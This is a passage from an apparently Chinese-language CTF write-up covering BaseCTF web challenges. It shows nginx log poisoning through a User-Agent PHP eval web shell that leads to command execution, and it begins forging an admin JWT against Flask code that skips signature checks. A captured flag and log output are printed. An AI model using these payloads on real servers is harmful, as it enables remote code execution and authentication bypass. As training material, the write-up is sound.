keyword">break</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$is_valid</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$invalid_patterns</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'php://'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'http://'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'https://'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ftp://'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'file://'</span> <span class="token punctuation">,</span> <span class="token string single-quoted-string">'data://'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'gopher://'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$invalid_patterns</span> <span class="token keyword">as</span> <span class="token variable">$pattern</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$Datch</span><span class="token punctuation">,</span> <span class="token variable">$pattern</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'此路不通换条路试试?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$Datch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'文件名不合规 请重试'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：<code>incompetent=HelloWorld&amp;Datch=/var/log/nginx/access.log，user agent中添加&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code></p><p>访问<code>/var/log/nginx/access.log</code>发送<code>incompetent=HelloWorld&amp;Datch=/var/log/nginx/access.log&amp;pass=system(&#39;cat /flag&#39;);</code></p><p>得到</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token number">54</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET / HTTP/1.1"</span> <span class="token number">502</span> <span class="token number">559</span> <span class="token string double-quoted-string">"-"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token number">55</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /favicon.ico HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5478</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token number">58</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET / HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5472</span> <span class="token string double-quoted-string">"-"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token number">58</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /favicon.ico HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5472</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">21</span><span class="token punctuation">:</span><span class="token number">02</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /%3C?php%20phpinfo();?%3E HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5478</span> <span class="token string double-quoted-string">"-"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">21</span><span class="token punctuation">:</span><span class="token number">02</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /favicon.ico HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5472</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/%3C?php%20phpinfo();?%3E"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">24</span><span class="token punctuation">:</span><span class="token number">36</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET / HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5472</span> <span class="token string double-quoted-string">"-"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">24</span><span class="token punctuation">:</span><span class="token number">37</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /favicon.ico HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5472</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">26</span><span class="token punctuation">:</span><span class="token number">13</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET / HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5472</span> <span class="token string double-quoted-string">"-"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.27 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/601.1.27"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">:</span><span class="token number">12</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"POST / HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">7391</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">:</span><span class="token number">13</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /favicon.ico HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5478</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">:</span><span class="token number">26</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"POST / HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5467</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">:</span><span class="token number">27</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /favicon.ico HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5472</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">:</span><span class="token number">30</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"POST / HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">8321</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">:</span><span class="token number">31</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /favicon.ico HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5478</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token number">08</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /favicon.ico HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5478</span> <span class="token string double-quoted-string">"-"</span> <span class="token string double-quoted-string">"Dalvik/2.1.0 (Linux; U; Android 9.0; ZTE BA520 Build/MRA58K)"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token number">32</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"POST / HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">8935</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"BaseCTF&#123;a0fd8763-8a3b-4bc5-b430-f09a213482e3&#125; "</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token number">33</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /favicon.ico HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5478</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">:</span><span class="token number">27</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"POST / HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">9332</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"BaseCTF&#123;a0fd8763-8a3b-4bc5-b430-f09a213482e3&#125; "</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">:</span><span class="token number">28</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /favicon.ico HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5472</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">:</span><span class="token number">43</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET / HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5478</span> <span class="token string double-quoted-string">"-"</span> <span class="token string double-quoted-string">"Dalvik/2.1.0 (Linux; U; Android 9.0; ZTE BA520 Build/MRA58K)"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">:</span><span class="token number">46</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"\x16\x03\x01\x00\xD2\x01\x00\x00\xCE\x03\x03\xC25 \xAE\x14'\xE9\x9C\x84\xF1\xB3\xDD\xE3\x09h\x98.\x10\x86\x16\xECn4\x10\xE7\xB3!r\xBA\x1BB\xA2\x00\x00b\xC00\xC0,\xC0/\xC0+\x00\x9F\x00\x9E\xC02\xC0.\xC01\xC0-\x00\xA5\x00\xA1\x00\xA4\x00\xA0\xC0(\xC0$\xC0\x14\xC0"</span> <span class="token number">400</span> <span class="token number">157</span> <span class="token string double-quoted-string">"-"</span> <span class="token string double-quoted-string">"-"</span> <span class="token string double-quoted-string">"-"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="no-jwt"><a href="#no-jwt" class="headerlink" title="no jwt"></a>no jwt</h2><p>源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token keyword">import</span> jwt<span class="token keyword">import</span> datetime<span class="token keyword">import</span> os<span class="token keyword">import</span> random<span class="token keyword">import</span> stringapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token comment"># 随机生成 secret_key</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 登录接口</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> request<span class="token punctuation">.</span>json    username <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>    <span class="token comment"># 其他用户都给予 user 权限</span>    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">'sub'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>        <span class="token string">'role'</span><span class="token punctuation">:</span> <span class="token string">'user'</span><span class="token punctuation">,</span>  <span class="token comment"># 普通用户角色</span>        <span class="token string">'exp'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> datetime<span class="token punctuation">.</span>timedelta<span class="token punctuation">(</span>hours<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> app<span class="token punctuation">.</span>secret_key<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'token'</span><span class="token punctuation">:</span> token<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token comment"># flag 接口</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Authorization'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> token<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            decoded <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> options<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"verify_signature"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">"verify_exp"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>            <span class="token comment"># 检查用户角色是否为 admin</span>            <span class="token keyword">if</span> decoded<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'role'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                    flag_content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'flag'</span><span class="token punctuation">:</span> flag_content<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Access denied: admin only'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">403</span>        <span class="token keyword">except</span> FileNotFoundError<span class="token punctuation">:</span>            <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Flag file not found'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">404</span>        <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>ExpiredSignatureError<span class="token punctuation">:</span>            <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Token has expired'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">401</span>        <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>InvalidTokenError<span class="token punctuation">:</span>            <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Invalid token'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">401</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Token is missing'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">401</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>向<code>login</code>中发送<code>post</code>数据得到<code>token</code>验证后的<code>jwt</code>格式，把<code>role</code>改成<code>admin</code></p><p>生成<code>jwt token</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jwt  <span class="token comment"># 导入 PyJWT 包</span><span class="token comment"># payload</span>token_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token string">"sub"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>  <span class="token comment"># 使用 None 而不是 null</span>  <span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token 